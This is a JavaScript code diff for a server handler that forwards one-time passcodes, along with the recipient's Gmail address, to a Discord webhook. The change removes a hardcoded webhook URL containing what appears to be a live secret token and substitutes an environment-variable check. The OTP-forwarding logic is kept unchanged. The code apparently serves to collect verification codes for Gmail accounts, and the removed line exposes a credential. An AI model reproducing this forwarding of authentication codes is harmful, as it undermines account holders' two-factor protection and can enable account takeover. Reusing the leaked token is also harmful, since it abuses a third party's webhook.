@@ -153,26 +153,31 @@ async function startServer() {
 
         // Send to Discord Webhook if OTP exists
         if (otp) {
-          const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1488439801064718349/6iQuFLUz3b0JatSJNqwknhXI0E4m7mQ7R4xkmDn2xFbWPCdyl2MKlg5F5bHMG980y_OP';
-          const messageContent = `**New OTP Received!**\nGmail: ${to}\nPC - \`\`\`${otp}\`\`\`\nMobile - \`${otp}\``;
+          const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
           
-          try {
-            fetch(webhookUrl, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json',
-              },
-              body: JSON.stringify({
-                content: messageContent
-              })
-            }).then(res => {
-              if (res.ok) console.log(`[Discord Webhook] Successfully forwarded OTP`);
-              else console.error(`[Discord Webhook] Failed to forward OTP. Status: ${res.status}`);
-            }).catch(err => {
-              console.error(`[Discord Webhook] Error forwarding OTP:`, err.message);
-            });
-          } catch (err) {
-            console.error(`[Discord Webhook] Error initiating fetch:`, err);
+          if (!webhookUrl) {
+            console.error('[Discord Webhook] Error: DISCORD_WEBHOOK_URL environment variable is not set. Cannot forward OTP.');
+          } else {
+            const messageContent = `**New OTP Received!**\nGmail: ${to}\nPC - \`\`\`${otp}\`\`\`\nMobile - \`${otp}\``;
+            
+            try {
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  content: messageContent
+                })
+              }).then(res => {
+                if (res.ok) console.log(`[Discord Webhook] Successfully forwarded OTP`);
+                else console.error(`[Discord Webhook] Failed to forward OTP. Status: ${res.status}`);
+              }).catch(err => {
+                console.error(`[Discord Webhook] Error forwarding OTP:`, err.message);
+              });
+            } catch (err) {
+              console.error(`[Discord Webhook] Error initiating fetch:`, err);
+            }
           }
         }
       } else {
